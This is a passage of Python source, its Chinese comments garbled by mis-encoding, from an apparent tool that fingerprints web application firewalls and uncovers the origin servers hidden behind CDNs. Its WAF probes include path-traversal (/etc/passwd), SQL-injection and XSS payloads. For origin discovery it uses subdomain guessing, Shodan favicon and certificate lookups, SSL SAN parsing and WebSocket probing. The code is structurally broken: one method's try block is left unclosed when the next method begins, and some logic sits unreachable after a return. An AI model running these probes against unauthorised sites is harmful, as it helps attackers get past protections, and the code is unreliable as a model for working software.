            matched_patterns = sum(1 for pattern in fp['dom_patterns'] if pattern in content)
            if fp['dom_patterns']:
                match_score += (matched_patterns / len(fp['dom_patterns'])) * 0.2
        
        # å“åº”å¤§å°æ£€æŸ¥
        body_size = len(content)
        if fp['body_size_range'][0] <= body_size <= fp['body_size_range'][1]:
            match_score += 0.1
        
        # é˜ˆå€¼ï¼šåŒ¹é…åˆ†æ•°>0.5è®¤ä¸ºæ˜¯ç›®æ ‡ç«™ç‚¹
        is_match = match_score > 0.5
        if is_match:
            self.logger.info(f"    [+] ç›®æ ‡æŒ‡çº¹éªŒè¯é€šè¿‡ (åˆ†æ•°: {match_score:.2f})")
        else:
            self.logger.warning(f"    [!] ç›®æ ‡æŒ‡çº¹éªŒè¯å¤±è´¥ (åˆ†æ•°: {match_score:.2f})")
        
        return is_match
    
    async def _fingerprint_waf(self, url: str) -> Optional[str]:
        """æ—§ç‰ˆWAFæŒ‡çº¹è¯†åˆ« - ä¿æŒå…¼å®¹æ€§"""
        # ä½¿ç”¨ç¼“å­˜
        return await self._cached_operation(
            'waf',
            url,
            self._fingerprint_waf_impl,
            url
        )
    
    async def _fingerprint_waf_impl(self, url: str) -> Optional[str]:
        """WAFæŒ‡çº¹è¯†åˆ«çš„å®é™…å®ç°"""
        try:
            # å‘é€å¤šä¸ªæ¢æµ‹è¯·æ±‚
            probes = [
                {'path': '/', 'method': 'GET'},
                {'path': '/../../etc/passwd', 'method': 'GET'},  # è·¯å¾„éå†
                {'path': '/?id=1\'', 'method': 'GET'},  # SQLæ³¨å…¥
                {'path': '/', 'method': 'TRACE'},  # æ–¹æ³•æ¢æµ‹
                {'path': '/<script>alert(1)</script>', 'method': 'GET'}  # XSS
            ]
            
            detected_wafs = defaultdict(int)
            
            async with aiohttp.ClientSession() as session:
                for probe in probes:
                    try:
                        target = url.rstrip('/') + probe['path']
                        async with session.request(
                            probe['method'], 
                            target,
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False
                        ) as resp:
                            # åˆ†æå“åº”
                            headers = dict(resp.headers)
                            cookies = resp.cookies
                            body = await resp.text()
                            server = headers.get('Server', '').lower()
                            
                            # æ£€æŸ¥æ¯ä¸ªWAFçš„ç‰¹å¾
                            for waf_name, signatures in self.waf_signatures.items():
                                score = 0
                                
                                # æ£€æŸ¥å“åº”å¤´
                                for header in signatures.get('headers', []):
                                    if any(h.lower() == header.lower() for h in headers):
                                        score += 2
                                
                                # æ£€æŸ¥cookies
                                for cookie_prefix in signatures.get('cookies', []):
                                    if any(cookie_prefix in str(cookie.key) for cookie in cookies):
                                        score += 2
                                
                                # æ£€æŸ¥é”™è¯¯ä¿¡æ¯
                                for error in signatures.get('errors', []):
                                    if error.lower() in body.lower():
                                        score += 3
                                
                                # æ£€æŸ¥Serverå¤´
                                for server_sig in signatures.get('server', []):
                                    if server_sig.lower() in server:
                                        score += 2
                                
                                if score > 0:
                                    detected_wafs[waf_name] += score
                    
                    except Exception as e:
                        continue
            
            # è¿”å›å¾—åˆ†æœ€é«˜çš„WAF
            if detected_wafs:
                return max(detected_wafs.items(), key=lambda x: x[1])[0]
            
        except Exception as e:
            self.logger.error(f"[!] WAFæŒ‡çº¹è¯†åˆ«å¤±è´¥: {type(e).__name__} - {e}")
        
        return None
    
    async def _discover_origin_comprehensive(self, target_url: str, use_proxy: bool = False) -> List[OriginServer]:
        """ç»¼åˆæºç«™å‘ç°"""
        origin_servers = []
        domain = self._extract_domain(target_url)
        
        # å…ˆè·å–ç›®æ ‡æŒ‡çº¹ï¼ˆæ–°å¢ï¼‰
        await self._get_target_fingerprint(target_url, use_proxy=use_proxy)
        
        # å¹¶å‘æ‰§è¡Œå¤šç§å‘ç°æ–¹æ³•
        self.logger.info("    [*] å¯åŠ¨ç»¼åˆæºç«™å‘ç°ï¼Œä½¿ç”¨9ç§å‘ç°æŠ€æœ¯...")
        discovery_tasks = [
            self._find_via_dns_history(domain),
            self._find_via_subdomains(domain),
            self._find_via_ssl_search(domain),
            self._find_via_mx_records(domain),
            self._find_via_ssl_san(target_url, use_proxy=use_proxy),
            self._find_via_favicon_hash(target_url, use_proxy=use_proxy),
            self._find_via_jarm_fingerprint(target_url, use_proxy=use_proxy),
            self._find_via_websocket_leak(target_url, use_proxy=use_proxy),
            self._find_via_unique_headers(target_url, use_proxy=use_proxy)
        ]
        
        results = await asyncio.gather(*discovery_tasks, return_exceptions=True)
        
        # åˆå¹¶ç»“æœ
        seen_ips = set()
        for result in results:
            if isinstance(result, list):
                for server in result:
                    if server.ip not in seen_ips:
                        seen_ips.add(server.ip)
                        origin_servers.append(server)
        
        # éªŒè¯æºç«™
        if origin_servers:
            self.logger.info(f"    [*] å¼€å§‹éªŒè¯å‘ç°çš„{len(origin_servers)}ä¸ªæ½œåœ¨æºç«™...")
            origin_servers = await self._verify_origin_servers(origin_servers, domain)
        
        # å¢å¼ºçš„æ’åºé€»è¾‘ï¼ˆä¿®å¤5çš„æ ¸å¿ƒï¼‰
        # ç»¼åˆè€ƒè™‘åŸå§‹ç½®ä¿¡åº¦å’ŒéªŒè¯ç»“æœ
        for server in origin_servers:
            # æ ¹æ®éªŒè¯ç»“æœè°ƒæ•´æœ€ç»ˆåˆ†æ•°
            if server.is_verified:
                server.final_score = server.confidence * 1.5  # éªŒè¯é€šè¿‡åŠ æƒ
            elif 'verification' in server.services and 'partial' in server.services['verification']:
                server.final_score = server.confidence * 0.8  # éƒ¨åˆ†åŒ¹é…é™æƒ
            else:
                server.final_score = server.confidence * 0.3  # æœªéªŒè¯å¤§å¹…é™æƒ
        
        # æŒ‰æœ€ç»ˆåˆ†æ•°æ’åºï¼Œåªè¿”å›åˆ†æ•°>0.3çš„ç»“æœ
        origin_servers = [s for s in origin_servers if hasattr(s, 'final_score') and s.final_score > 0.3]
        return sorted(origin_servers, key=lambda x: x.final_score, reverse=True)
    
    async def _find_via_dns_history(self, domain: str) -> List[OriginServer]:
        """é€šè¿‡DNSå†å²è®°å½•æŸ¥æ‰¾"""
        # ä½¿ç”¨ç¼“å­˜çš„DNSæŸ¥è¯¢
        return await self._cached_operation(
            'dns', 
            f'dns_history_{domain}',
            self._find_via_dns_history_impl,
            domain
        )
    
    async def _find_via_dns_history_impl(self, domain: str) -> List[OriginServer]:
        """DNSå†å²è®°å½•æŸ¥æ‰¾çš„å®é™…å®ç°"""
        servers = []
        
        # å¤šä¸ªDNSæœåŠ¡å™¨å¢åŠ æˆåŠŸç‡
        dns_servers = [
            ['8.8.8.8', '8.8.4.4'],      # Google
            ['1.1.1.1', '1.0.0.1'],      # Cloudflare
            ['9.9.9.9', '149.112.112.112'], # Quad9
            ['208.67.222.222', '208.67.220.220']  # OpenDNS
        ]
        
        for nameservers in dns_servers:
            try:
                # å¼‚æ­¥DNSæŸ¥è¯¢ - ä¿®å¤é˜»å¡é—®é¢˜
                def _sync_dns_query():
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = nameservers
                    resolver.timeout = 3
                    resolver.lifetime = 3
                    return resolver.resolve(domain, 'A')
                
                # Aè®°å½•æŸ¥è¯¢ - å¼‚æ­¥åŒ…è£…
                try:
                    answers = await asyncio.to_thread(_sync_dns_query)
                    for rdata in answers:
                        ip = str(rdata)
                        if not self._is_cdn_ip(ip):
                            servers.append(OriginServer(
                                ip=ip,
                                confidence=0.5,
                                discovery_method='dns_current'
                            ))
                except dns.resolver.NXDOMAIN:
                    self.logger.warning(f"[!] åŸŸåä¸å­˜åœ¨: {domain}")
                    continue
                except dns.resolver.Timeout:
                    self.logger.warning(f"[!] DNSæŸ¥è¯¢è¶…æ—¶ (æœåŠ¡å™¨: {nameservers[0]})")
                    continue
                except dns.resolver.NoAnswer:
                    continue
                
                # CNAMEè®°å½•æŸ¥è¯¢ï¼ˆå¯èƒ½æš´éœ²æºç«™ï¼‰- å¼‚æ­¥ä¿®å¤
                try:
                    def _sync_cname_query():
                        resolver = dns.resolver.Resolver()
                        resolver.nameservers = nameservers
                        resolver.timeout = 3
                        resolver.lifetime = 3
                        return resolver.resolve(domain, 'CNAME')
                    
                    cname_answers = await asyncio.to_thread(_sync_cname_query)
                    for cname in cname_answers:
                        cname_str = str(cname).rstrip('.')
                        if 'origin' in cname_str or 'direct' in cname_str:
                            # è§£æCNAMEçš„Aè®°å½• - å¼‚æ­¥
                            try:
                                def _sync_a_query():
                                    resolver = dns.resolver.Resolver()
                                    resolver.nameservers = nameservers
                                    resolver.timeout = 3
                                    resolver.lifetime = 3
                                    return resolver.resolve(cname_str, 'A')
                                
                                a_answers = await asyncio.to_thread(_sync_a_query)
                                for rdata in a_answers:
                                    ip = str(rdata)
                                    if not self._is_cdn_ip(ip):
                                        servers.append(OriginServer(
                                            ip=ip,
                                            confidence=0.7,
                                            discovery_method='cname_leak'
                                        ))
                            except:
                                pass
                except:
                    pass
                    
                # å¦‚æœæ‰¾åˆ°ç»“æœå°±ä¸ç»§ç»­å…¶ä»–DNSæœåŠ¡å™¨äº†
                if servers:
                    break
                    
            except Exception as e:
                self.logger.warning(f"[!] DNSæŸ¥è¯¢å¼‚å¸¸ ({nameservers[0]}): {type(e).__name__} - {str(e)[:100]}")
                continue
        
        return list({s.ip: s for s in servers}.values())  # å»é‡
    
    async def _find_via_subdomains(self, domain: str) -> List[OriginServer]:
        """é€šè¿‡å­åŸŸåæš´éœ²æŸ¥æ‰¾"""
        servers = []
        
        # å¸¸è§çš„æš´éœ²æºç«™çš„å­åŸŸå
        test_subdomains = [
            'origin', 'origin-www', 'origin-api',
            'direct', 'bypass', 'admin', 'cpanel',
            'ftp', 'mail', 'webmail', 'smtp',
            'staging', 'dev', 'test', 'beta',
            'api', 'api-internal', 'backend',
            'ns1', 'ns2', 'dns1', 'dns2'
        ]
        
        try:
            self.logger.info(f"    [*] å¼€å§‹å­åŸŸåæ‰«æï¼Œæµ‹è¯•{len(test_subdomains)}ä¸ªå­åŸŸå...")
            # å¼‚æ­¥å­åŸŸåDNSæŸ¥è¯¢ - ä¿®å¤é˜»å¡
            async def _resolve_subdomain(subdomain):
                try:
                    full_domain = f"{subdomain}.{domain}"
                    
                    def _sync_subdomain_query():
                        resolver = dns.resolver.Resolver()
                        resolver.timeout = 2
                        resolver.lifetime = 2
                        return resolver.resolve(full_domain, 'A')
                    
                    answers = await asyncio.to_thread(_sync_subdomain_query)
                    subdomain_servers = []
                    for rdata in answers:
                        ip = str(rdata)
                        if not self._is_cdn_ip(ip):
                            subdomain_servers.append(OriginServer(
                                ip=ip,
                                confidence=0.7,
                                discovery_method=f'subdomain_{subdomain}'
                            ))
                    return subdomain_servers
                except dns.resolver.NXDOMAIN:
                    return []
                except dns.resolver.Timeout:
                    return []
                except Exception:
                    return []
            
            # å¹¶å‘æŸ¥è¯¢æ‰€æœ‰å­åŸŸå - æ€§èƒ½å¤§å¹…æå‡
            subdomain_tasks = [_resolve_subdomain(sub) for sub in test_subdomains]
            results = await asyncio.gather(*subdomain_tasks, return_exceptions=True)
            
            # åˆå¹¶ç»“æœ
            for result in results:
                if isinstance(result, list):
                    servers.extend(result)
                        
        except Exception as e:
            self.logger.warning(f"[!] å­åŸŸåæ‰«æå¼‚å¸¸: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _find_via_ssl_search(self, domain: str) -> List[OriginServer]:
        """é€šè¿‡SSLè¯ä¹¦æœç´¢æŸ¥æ‰¾"""
        servers = []
        
        if self.shodan_client:
            try:
                # å¼‚æ­¥Shodanæœç´¢ - ä¿®å¤é˜»å¡
                def _sync_shodan_search():
                    query = f'ssl.cert.subject.cn:"{domain}"'
                    return self.shodan_client.search(query, limit=20)
                
                results = await asyncio.to_thread(_sync_shodan_search)
                
                for result in results['matches']:
                    ip = result['ip_str']
                    if not self._is_cdn_ip(ip):
                        servers.append(OriginServer(
                            ip=ip,
                            confidence=0.8,
                            discovery_method='ssl_certificate',
                            ports=[result.get('port', 443)]
                        ))
            except Exception as e:
                self.logger.warning(f"[!] SSLè¯ä¹¦æœç´¢å¤±è´¥: {type(e).__name__} - {e}")
        
        return servers
    
    async def _find_via_mx_records(self, domain: str) -> List[OriginServer]:
        """é€šè¿‡é‚®ä»¶æœåŠ¡å™¨è®°å½•æŸ¥æ‰¾"""
        servers = []
        
        try:
            # å¼‚æ­¥MXè®°å½•æŸ¥è¯¢ - ä¿®å¤é˜»å¡
            def _sync_mx_query():
                resolver = dns.resolver.Resolver()
                resolver.timeout = 2
                resolver.lifetime = 2
                return resolver.resolve(domain, 'MX')
            
            # æŸ¥è¯¢MXè®°å½•
            try:
                mx_records = await asyncio.to_thread(_sync_mx_query)
                
                # å¹¶å‘è§£ææ‰€æœ‰MXä¸»æœºçš„IP
                async def _resolve_mx_ip(mx_host):
                    try:
                        def _sync_mx_a_query():
                            resolver = dns.resolver.Resolver()
                            resolver.timeout = 2
                            resolver.lifetime = 2
                            return resolver.resolve(mx_host, 'A')
                        
                        answers = await asyncio.to_thread(_sync_mx_a_query)
                        mx_servers = []
                        for rdata in answers:
                            ip = str(rdata)
                            mx_servers.append(OriginServer(
                                ip=ip,
                                confidence=0.6,
                                discovery_method='mx_record'
                            ))
                        return mx_servers
                    except:
                        return []
                
                # å¹¶å‘æŸ¥è¯¢æ‰€æœ‰MXä¸»æœº
                mx_hosts = [str(mx.exchange).rstrip('.') for mx in mx_records]
                mx_tasks = [_resolve_mx_ip(mx_host) for mx_host in mx_hosts]
                mx_results = await asyncio.gather(*mx_tasks, return_exceptions=True)
                
                # åˆå¹¶ç»“æœ
                for result in mx_results:
                    if isinstance(result, list):
                        servers.extend(result)
            except:
                pass
                
        except Exception as e:
            self.logger.warning(f"[!] MXè®°å½•æŸ¥è¯¢å¤±è´¥: {type(e).__name__} - {e}")
        
        return servers
    
    async def _find_via_ssl_san(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """é€šè¿‡SSLè¯ä¹¦SANæ‰¾å…³è”åŸŸå - é«˜ä»·å€¼æ–¹æ³•"""
        # ä½¿ç”¨ç¼“å­˜ - ä¿®å¤use_proxyå‚æ•°ä¼ é€’
        cache_key = f"ssl_san_{url}_{use_proxy}"
        return await self._cached_operation(
            'ssl_san',
            cache_key,
            self._find_via_ssl_san_impl,
            url, use_proxy
        )
    
    async def _find_via_ssl_san_impl(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """SSL SANæŸ¥æ‰¾çš„å®é™…å®ç°"""
        servers = []
        domain = self._extract_domain(url)
        
        try:
            # è·å–SSLè¯ä¹¦
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # è§£æä¸»æœºå’Œç«¯å£
            if url.startswith(('http://', 'https://')):
                parsed = urllib.parse.urlparse(url)
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            else:
                host = domain
                port = 443
            
            # å»ºç«‹SSLè¿æ¥è·å–è¯ä¹¦ - ä¿®å¤ä»£ç†æ”¯æŒ
            async def _get_ssl_cert():
                self.logger.debug(f"[SSLè°ƒè¯•] å¼€å§‹è¿æ¥ {host}:{port}")
                self.logger.debug(f"[SSLè°ƒè¯•] ä»£ç†æ¨¡å¼: {use_proxy}")
                
                if use_proxy and PROXY_AVAILABLE:
                    # ä»£ç†æ¨¡å¼ - ä½¿ç”¨aiohttpä»£ç†è¿æ¥è·å–è¯ä¹¦
                    return await self._get_cert_via_proxy(host, port)
                else:
                    # ç›´è¿æ¨¡å¼ - åŸå§‹socketè¿æ¥
                    return await self._get_cert_direct(host, port, context)
            
            cert = await _get_ssl_cert()
    
    async def _get_cert_via_proxy(self, host: str, port: int) -> dict:
        """é€šè¿‡ä»£ç†è·å–SSLè¯ä¹¦"""
        try:
            self.logger.debug(f"[SSLè°ƒè¯•] ä½¿ç”¨ä»£ç†è·å–è¯ä¹¦: {host}:{port}")
            
            # è·å–ä»£ç†ä¼šè¯
            proxy_session_result = await get_proxy_session()
            if not proxy_session_result:
                self.logger.warning(f"[SSLè°ƒè¯•] ä»£ç†ä¼šè¯è·å–å¤±è´¥ï¼Œé™çº§åˆ°ç›´è¿")
                context = ssl.create_default_context()
                context.check_hostname = False  
                context.verify_mode = ssl.CERT_NONE
                return await self._get_cert_direct(host, port, context)
            
            session, proxy_url = proxy_session_result
            self.logger.debug(f"[SSLè°ƒè¯•] ä½¿ç”¨ä»£ç†: {proxy_url}")
            
            # ä½¿ç”¨aiohttpé€šè¿‡ä»£ç†å»ºç«‹SSLè¿æ¥è·å–è¯ä¹¦ä¿¡æ¯
            try:
                test_url = f"https://{host}:{port}/"
                async with session.get(test_url, ssl=False) as response:
                    # ä»è¿æ¥ä¿¡æ¯è·å–è¯ä¹¦ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰
                    self.logger.debug(f"[SSLè°ƒè¯•] ä»£ç†SSLè¿æ¥æˆåŠŸ: {response.status}")
                    # æ³¨æ„ï¼šaiohttpæ¨¡å¼ä¸‹ç›´æ¥è·å–è¯ä¹¦æ¯”è¾ƒå¤æ‚
                    # è¿™é‡Œè¿”å›åŸºæœ¬ä¿¡æ¯ï¼Œæˆ–è€…é™çº§åˆ°ç›´è¿æ¨¡å¼
                    return {}
            finally:
                await session.close()
                
        except Exception as e:
            self.logger.warning(f"[SSLè°ƒè¯•] ä»£ç†SSLè¿æ¥å¤±è´¥: {type(e).__name__} - {str(e)}")
            # é™çº§åˆ°ç›´è¿æ¨¡å¼
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            return await self._get_cert_direct(host, port, context)
    
    async def _get_cert_direct(self, host: str, port: int, context) -> dict:
        """ç›´è¿æ¨¡å¼è·å–SSLè¯ä¹¦"""
        def _sync_ssl_connect():
            self.logger.debug(f"[SSLè°ƒè¯•] ç›´è¿æ¨¡å¼è¿æ¥: {host}:{port}")
            
            try:
                sock = socket.create_connection((host, port), timeout=5)
                self.logger.debug(f"[SSLè°ƒè¯•] å¥—æ¥å­—è¿æ¥æˆåŠŸ")
                
                ssock = context.wrap_socket(sock, server_hostname=host)
                self.logger.debug(f"[SSLè°ƒè¯•] SSLæ¡æ‰‹æˆåŠŸ")
                
                cert = ssock.getpeercert()
                self.logger.debug(f"[SSLè°ƒè¯•] è¯ä¹¦è·å–æˆåŠŸ")
                
                ssock.close()
                sock.close()
                return cert
                
            except ssl.SSLError as ssl_err:
                self.logger.warning(f"[SSLè°ƒè¯•] ç›´è¿SSLæ¡æ‰‹å¤±è´¥: {type(ssl_err).__name__} - {str(ssl_err)}")
                self.logger.warning(f"[SSLè°ƒè¯•] å¤±è´¥ä¸»æœº: {host}:{port}")
                raise ssl_err
            except socket.error as sock_err:
                self.logger.warning(f"[SSLè°ƒè¯•] ç›´è¿å¥—æ¥å­—å¤±è´¥: {type(sock_err).__name__} - {str(sock_err)}")
                raise sock_err
        
        return await asyncio.to_thread(_sync_ssl_connect)
        
        # æå–SAN (Subject Alternative Names)
        san_list = []
        if cert and 'subjectAltName' in cert:
            for type_, value in cert['subjectAltName']:
                if type_ == 'DNS':
                    san_list.append(value)
        
        # åˆ†æSANä¸­çš„åŸŸå
        origin_patterns = [
            'origin', 'source', 'real', 'actual', 'direct',
            'internal', 'private', 'backend', 'server',
            'node', 'web', 'www-origin', 'www-real'
        ]
        
        # å¼‚æ­¥è§£æSANåŸŸå - ä¿®å¤resolveré˜»å¡
        async def _resolve_san_domain(san_domain):
            try:
                # æ£€æŸ¥æ˜¯å¦åŒ…å«æºç«™å…³é”®è¯
                is_potential_origin = any(pattern in san_domain.lower() for pattern in origin_patterns)
                
                # è·³è¿‡é€šé…ç¬¦è¯ä¹¦
                if san_domain.startswith('*.'):
                    san_domain = san_domain[2:]
                
                # å¦‚æœä¸æ˜¯å½“å‰åŸŸåä¸”å¯èƒ½æ˜¯æºç«™
                if san_domain != domain and (is_potential_origin or 'cdn' not in san_domain.lower()):
                    def _sync_san_resolve():
                        resolver = dns.resolver.Resolver()
                        resolver.timeout = 2
                        resolver.lifetime = 2
                        return resolver.resolve(san_domain, 'A')
                    
                    answers = await asyncio.to_thread(_sync_san_resolve)
                    san_servers = []
                    for rdata in answers:
                        ip = str(rdata)
                        if not self._is_cdn_ip(ip):
                            san_servers.append(OriginServer(
                                ip=ip,
                                confidence=0.85 if is_potential_origin else 0.65,
                                discovery_method=f'ssl_san_{san_domain}',
                                ports=[443]
                            ))
                            self.logger.info(f"[+] SSL SANå‘ç°æ½œåœ¨æºç«™åŸŸå: {san_domain} -> {ip}")
                    return san_servers
            except:
                return []
        
        # å¹¶å‘è§£ææ‰€æœ‰SANåŸŸå
        if san_list:
            san_tasks = [_resolve_san_domain(san_domain) for san_domain in san_list]
            san_results = await asyncio.gather(*san_tasks, return_exceptions=True)
            
            # åˆå¹¶ç»“æœ
            for result in san_results:
                if isinstance(result, list):
                    servers.extend(result)
            
            # é¢å¤–æ£€æŸ¥ï¼šè¯ä¹¦CN (Common Name) - å¼‚æ­¥ä¿®å¤
            if 'subject' in cert:
                async def _resolve_cn_domain(cn_value):
                    if cn_value != domain and any(pattern in cn_value.lower() for pattern in origin_patterns):
                        try:
                            def _sync_cn_resolve():
                                resolver = dns.resolver.Resolver()
                                resolver.timeout = 2
                                resolver.lifetime = 2
                                return resolver.resolve(cn_value, 'A')
                            
                            answers = await asyncio.to_thread(_sync_cn_resolve)
                            cn_servers = []
                            for rdata in answers:
                                ip = str(rdata)
                                if not self._is_cdn_ip(ip):
                                    cn_servers.append(OriginServer(
                                        ip=ip,
                                        confidence=0.8,
                                        discovery_method=f'ssl_cn_{cn_value}',
                                        ports=[443]
                                    ))
                            return cn_servers
                        except:
                            return []
                    return []
                
                # æå–æ‰€æœ‰CNå€¼
                cn_values = []
                for rdn in cert['subject']:
                    for name, value in rdn:
                        if name == 'commonName':
                            cn_values.append(value)
                
                # å¹¶å‘è§£ææ‰€æœ‰CNåŸŸå
                if cn_values:
                    cn_tasks = [_resolve_cn_domain(cn_val) for cn_val in cn_values]
                    cn_results = await asyncio.gather(*cn_tasks, return_exceptions=True)
                    
                    # åˆå¹¶ç»“æœ
                    for result in cn_results:
                        if isinstance(result, list):
                            servers.extend(result)
                                            
        except socket.timeout:
            self.logger.warning(f"[!] SSLè¿æ¥è¶…æ—¶: {domain}")
        except ssl.SSLError as e:
            self.logger.warning(f"[!] SSLé”™è¯¯: {type(e).__name__}")
        except Exception as e:
            self.logger.warning(f"[!] SSL SANåˆ†æå¤±è´¥: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _find_via_favicon_hash(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """é€šè¿‡faviconå“ˆå¸ŒæŸ¥æ‰¾ - å¢å¼ºç‰ˆ"""
        servers = []
        
        # å¸¸è§é»˜è®¤faviconçš„mmh3å“ˆå¸Œå€¼
        default_favicon_hashes = [
            -1198808341,  # Apacheé»˜è®¤
            -297069493,   # nginxé»˜è®¤
            1485257654,   # IISé»˜è®¤
            -38705358,    # Tomcaté»˜è®¤
            628535358,    # Spring Booté»˜è®¤
            -1255347784,  # WordPressé»˜è®¤
            -235701012,   # phpMyAdmin
            1405460984,   # XAMPP
            2128230701,   # DirectAdmin
            -1277814690   # Reacté»˜è®¤
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                favicon_url = url.rstrip('/') + '/favicon.ico'
                async with session.get(favicon_url, ssl=False) as resp:
                    if resp.status == 200:
                        favicon_data = await resp.read()
                        
                        # è®¡ç®—mmh3å“ˆå¸Œ
                        if HAS_MMH3:
                            favicon_hash = mmh3.hash(base64.b64encode(favicon_data).decode())
                        else:
                            favicon_hash = mmh3_hash_fallback(base64.b64encode(favicon_data).decode())
                        
                        # æ£€æŸ¥æ˜¯å¦ä¸ºé»˜è®¤favicon
                        if favicon_hash in default_favicon_hashes:
                            self.logger.warning(f"[!] æ£€æµ‹åˆ°é»˜è®¤faviconï¼Œè·³è¿‡æœç´¢")
                            return servers
                        
                        # æ£€æŸ¥faviconå¤§å°ï¼ˆå¤ªå°æˆ–å¤ªå¤§çš„å¯èƒ½æ˜¯é€šç”¨çš„ï¼‰
                        favicon_size = len(favicon_data)
                        if favicon_size < 100 or favicon_size > 50000:
                            self.logger.warning(f"[!] Faviconå¤§å°å¼‚å¸¸ ({favicon_size} bytes)ï¼Œé™ä½ç½®ä¿¡åº¦")
                            confidence_modifier = 0.5
                        else:
                            confidence_modifier = 1.0
                        
                        if self.shodan_client:
                            try:
                                self.logger.info("    [*] [è€—æ—¶æ“ä½œ] æ­£åœ¨é€šè¿‡Shodan APIåæŸ¥Faviconå“ˆå¸Œ...")
                                # å¼‚æ­¥Shodan faviconæœç´¢ - ä¿®å¤é˜»å¡
                                def _sync_favicon_search():
                                    query = f'http.favicon.hash:{favicon_hash}'
                                    return self.shodan_client.search(query, limit=10)
                                
                                results = await asyncio.to_thread(_sync_favicon_search)
                                
                                self.logger.info("    [+] FaviconåæŸ¥å®Œæˆã€‚")
                                
                                for result in results['matches']:
                                    ip = result['ip_str']
                                    if not self._is_cdn_ip(ip):
                                        servers.append(OriginServer(
                                            ip=ip,
                                            confidence=0.9 * confidence_modifier,
                                            discovery_method='favicon_hash',
                                            ports=[result.get('port', 80)],
                                            services={'favicon_hash': str(favicon_hash)}
                                        ))
                            except shodan.APIError as e:
                                self.logger.error(f"[!] Shodan APIé”™è¯¯: {e}")
                                
        except Exception as e:
            self.logger.warning(f"[!] Faviconå“ˆå¸Œæœç´¢å¼‚å¸¸: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _find_via_websocket_leak(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """é€šè¿‡WebSocketæ³„éœ²æŸ¥æ‰¾"""
        servers = []
        
        # WebSocketå¸¸è§ç«¯ç‚¹
        ws_endpoints = [
            '/ws', '/websocket', '/socket.io/', '/wss',
            '/api/ws', '/api/websocket', '/stream',
            '/notifications', '/events', '/chat',
            '/cable', '/sockjs', '/bayeux'  # Rails ActionCable, SockJS, Faye
        ]
        
        base_url = url.rstrip('/')
        test_urls = []
        
        # æ„å»ºæµ‹è¯•URL
        for endpoint in ws_endpoints:
            ws_url = base_url.replace('http://', 'ws://').replace('https://', 'wss://') + endpoint
            test_urls.append(ws_url)
        
        # æ·»åŠ æ ¹è·¯å¾„WebSocket
        test_urls.append(base_url.replace('http://', 'ws://').replace('https://', 'wss://'))
        
        async with aiohttp.ClientSession() as session:
            for ws_url in test_urls:
                try:
                    # å°è¯•WebSocketæ¡æ‰‹
                    async with session.ws_connect(
                        ws_url,
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False,
                        headers={
                            'Origin': base_url,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    ) as ws:
                        # æˆåŠŸè¿æ¥ï¼Œæå–çœŸå®IPä¿¡æ¯
                        # ä»å“åº”å¤´æˆ–è¿æ¥ä¿¡æ¯ä¸­æŸ¥æ‰¾IPæ³„éœ²
                        
                        # å‘é€æµ‹è¯•æ¶ˆæ¯
                        await ws.send_str('{"type":"ping"}')
                        
                        # ç­‰å¾…å“åº”ï¼ˆå¯èƒ½åŒ…å«æœåŠ¡å™¨ä¿¡æ¯ï¼‰
                        try:
                            msg = await asyncio.wait_for(ws.receive(), timeout=2)
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                data = msg.data
                                
                                # æŸ¥æ‰¾IPåœ°å€æ¨¡å¼
                                import re
                                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                                found_ips = re.findall(ip_pattern, data)
                                
                                for ip in found_ips:
                                    if not self._is_cdn_ip(ip) and not ip.startswith('192.168.'):
                                        servers.append(OriginServer(
                                            ip=ip,
                                            confidence=0.8,
                                            discovery_method='websocket_leak',
                                            ports=[80, 443]
                                        ))
                        except asyncio.TimeoutError:
                            pass
                        
                        await ws.close()
                        self.logger.info(f"[+] WebSocketè¿æ¥æˆåŠŸ: {ws_url}")
                        
                except aiohttp.WSServerHandshakeError as e:
                    # æ¡æ‰‹å¤±è´¥ä½†å¯èƒ½æš´éœ²ä¿¡æ¯
                    if hasattr(e, 'headers'):
                        # æ£€æŸ¥é”™è¯¯å“åº”å¤´
                        server_header = e.headers.get('Server', '')
                        if 'nginx' in server_header.lower() or 'apache' in server_header.lower():
                            # å¯èƒ½æ˜¯çœŸå®æœåŠ¡å™¨
                            pass
                            
                except aiohttp.ClientConnectorError:
                    # è¿æ¥å¤±è´¥
                    continue
                except aiohttp.ClientError:
                    # å…¶ä»–å®¢æˆ·ç«¯é”™è¯¯
                    continue
                except asyncio.TimeoutError:
                    # è¶…æ—¶
                    continue
                except Exception as e:
                    if 'SSL' not in str(e):  # å¿½ç•¥SSLé”™è¯¯
                        self.logger.warning(f"[!] WebSocketæµ‹è¯•å¼‚å¸¸ ({ws_url}): {type(e).__name__} - {str(e)[:50]}")
        
        return servers
    
    async def _find_via_jarm_fingerprint(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """é€šè¿‡JARMæŒ‡çº¹è¯†åˆ«æ‰¾æºç«™"""
        servers = []
        domain = self._extract_domain(url)
        
        try:
            # é¦–å…ˆè·å–ç›®æ ‡çš„JARMæŒ‡çº¹
            target_jarm = await self._get_jarm_fingerprint(domain, 443, use_proxy)
            if not target_jarm:
                self.logger.error(f"[!] æ— æ³•è·å–ç›®æ ‡JARMæŒ‡çº¹: {domain}")
                return servers
            
            self.logger.info(f"[+] ç›®æ ‡JARMæŒ‡çº¹: {target_jarm[:32]}...")
            
            # å¦‚æœæœ‰Shodanï¼Œæœç´¢ç›¸åŒJARMçš„æœåŠ¡å™¨ - å¼‚æ­¥ä¿®å¤
            if self.shodan_client:
                try:
